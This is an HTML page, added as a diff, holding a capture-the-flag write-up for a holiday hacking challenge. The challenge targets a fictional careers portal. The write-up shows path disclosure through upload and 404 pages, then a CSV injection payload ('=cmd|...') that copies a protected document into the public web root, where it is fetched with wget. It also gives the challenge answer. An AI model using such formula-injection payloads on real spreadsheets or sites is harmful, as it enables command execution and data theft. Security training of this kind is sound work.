@@ -1,0 +1,51 @@
+<!DOCTYPE html><head><link rel="stylesheet" href="style.css" type="text/css" media="all"/><style type="text/css">.code-black-background{color:#e0e0e0;background-color:#1f1f1f;}</style></head><body><div class="entry-title entry-title-no-feat-img">
+<h1>Objective 7: HR Incident Response</h1>
+</div><div class="entry-content">
+<figure class="wp-block-image">
+  <img src="objective7.gif" alt="" class="wp-image-839">
+</figure>
+<p>Difficulty: 4/5
+  <br>
+  <br>Santa uses an Elf Resources website to look for talented information security
+  professionals. Gain access to the website (https://careers.kringlecastle.com/)
+  and fetch the document C:\candidate_evaluation.docx.
+  <br><strong>Which terrorist organization is secretly supported by the job applicant whose name begins with &quot;K.&quot;?</strong>
+  <br>
+  <br>For hints on achieving this objective, please visit Sparkle Redberry and
+  help her with the Dev Ops Fail Cranberry Pi terminal challenge.
+  <br>Note: Sparkle Redberry can be found on Floor 1, lobby area (Area 3), left
+  <br>
+  <br>Hints given:
+  <br>Somehow Brian Hostetler is giving a talk on CSV injection WHILE he&apos;s
+  giving a talk on Trufflehog. Whatta&apos; guy! (https://www.youtube.com/watch?v=Z3qpcKVv2Bg)
+  <br>https://www.owasp.org/index.php/CSV_Injection</p>
+<p>
+  <br>The objective can be accessed directly via this link:
+  <br>https://careers.kringlecastle.com/
+  <br>
+</p>
+<hr class="wp-block-separator">
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>When uploading an empty test.csv file to the website, the website discloses
+  the location of the document to the website visitor:</p>
+<pre class="wp-block-code"><code>C:\candidate_evaluation.docx</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>When navigating to a non-existent page (e.g. https://careers.kringlecastle.com/test)
+  , the website discloses the real path of the webserver root, and the corresponding
+  URL</p>
+<pre class="wp-block-code"><code>404 Error!
+Publicly accessible file served from:
+C:\careerportal\resources\public\ not found......
+Try:
+https://careers.kringlecastle.com/public/&apos;file name you are looking for&apos;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Using those pieces of information, it is possible to craft a malicious CSV file</p>
+<pre class="wp-block-code"><code>=cmd|&apos; /C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\frog.doc&apos;!A1</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The file can then be downloaded from the webserver</p>
+<pre class="wp-block-code code-black-background"><code>wget https://careers.kringlecastle.com/public/frog.doc</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The file mentions that Krampus was linked to the terrorist organization:
+  <br><strong>Fancy Beaver</strong>
+</p>
+</div></body></html>
